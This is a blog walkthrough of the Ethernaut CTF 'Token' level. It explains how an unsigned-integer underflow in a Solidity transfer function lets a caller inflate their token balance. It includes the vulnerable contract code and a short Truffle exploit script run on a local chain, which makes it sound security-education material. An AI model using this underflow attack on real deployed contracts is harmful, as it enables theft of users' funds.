Title: Solving Zeppelin's Ethernaut CTF - Token
Date: 2018-06-10 22:00
Tags: ethereum, solidity, ctf, smart contracts
Category: Ethereum
Slug: solving-zeppelin-ethernaut-ctf-token
Summary: Sixth post of a series in which we tackle the challenges in the [Ethernaut CTF by Zeppelin](https://ethernaut.zeppelin.solutions/){:target="_blank",:rel="noopener"}. In Token, we hack a basic token contract and manage our way to earn a huge amount of ethers.

## Introduction
The [Token contract](https://ethernaut.zeppelin.solutions/level/0x6545df87f57d21cb096a0bfcc53a70464d062512){:rel="noopener"} simulates a basic token built on the Ethereum blockchain. It is not a full [ERC20](https://theethereum.wiki/w/index.php/ERC20_Token_Standard), but hey, you gotta start somewhere. Our main goal is to 'steal' as many tokens as we can from the contract, so let's dive right into it.

## The Token contract
The contract is deployed with some initial supply of tokens, as you can see in its constructor. That initial supply is both set as the total supply of tokens and saved as the balance of the contract's deployer.
~~~solidity
function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
}
~~~

The function `balanceOf` lets any caller see how many token a certain address has.
~~~solidity
function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
}
~~~

Finally, the `transfer` function is where the core business logic of the contract lives, and where we're gonna aim our weapons at:
~~~solidity
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
~~~

It basically allows any caller to 'send' (i.e. change the balances in the contract's storage) a certain amount (`_value`) of tokens from his/her address to the one passed as an argument (`_to`).

While the first line *tries* to ensure the caller has enough tokens to make the transaction, lines 2 and 3 actually implement the swap between the source and destination addresses.

Focus on line 1 for now: `require(balances[msg.sender] - _value >= 0);`.

We know that `balances[msg.sender]` and `_value` are both `uint` variables, right ? Well, then you're witnessing a real Solidity underflow, which results from unsafely extracting an `uint` from another.Let me put it straight. The difference between two `uint`, is another `uint`, meaning that the difference will always be equal or greater than zero! Thus, the condition `balances[msg.sender] - _value >= 0` will always evaluate to true.

Following that line of thought, the second line of the function is where our balance is decreased. However, we can underflow that as well!. According to the challenge text, our account starts with 20 tokens. What if we tried transferred 21 tokens ?. The resulting operation would look like:

~~~solidity
balances[msg.sender] = 20 - 21;
~~~

Since a `uint` cannot take the value -1, instead the variable underflows and the result of the operation, stored as the caller's balance, is 2^256 - 1.

Having analyzed the contract's vulnerability, include its code in `contracts/Token.sol` and deploy it to the local blockchain by including the following snippet in `migrations/2_deploy_contracts.js`.

~~~javascript
let Token = artifacts.require('./Token.sol')
const TOKEN_INITIAL_SUPPLY = 20
module.exports = deployer => {
    deployer.deploy(Token, TOKEN_INITIAL_SUPPLY)
}
~~~

Then run `truffle migrate`.

## The exploit
In this case, the vulnerability is easy to exploit. The exploit consists of just calling the `transfer` function with a value greater than 20.
~~~javascript
const TokenContract = artifacts.require('Token')
const assert = require('assert')

async function execute(callback) {

    let contract = await TokenContract.deployed()

    let balance = await contract.balanceOf(web3.eth.accounts[0])
    assert.equal(balance, 20)
    console.log(`Initial balance: ${balance}`)

    await contract.transfer(web3.eth.accounts[1], 21)

    balance = await contract.balanceOf(web3.eth.accounts[0])
    assert.equal(balance > 20, true)
    console.log(`Final balance: ${balance} tokens`)

}

module.exports = execute
~~~

That's it. After running `truffle exec exploits/token.exploit.js`, you should see that the balance of the account if far greater than 20 tokens.

You can also [find the exploit code at my Github repo](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/token.exploit.js). Although you might find some differences between the code in the repository and the one included in this post, the exploits work exactly the same. I made some changes to the exploit written here to make it simpler and clearer.

Thanks for reading! In the [next part](https://hackingmood.com/solving-zeppelin-ethernaut-ctf-delegation) of these series, we will tackle the [Delegation challenge](https://ethernaut.zeppelin.solutions/level/0x68756ad5e1039e4f3b895cfaa16a3a79a5a73c59){:rel="noopener"} and study the dangers of using a low-level call such as `delegatecall` in Solidity.
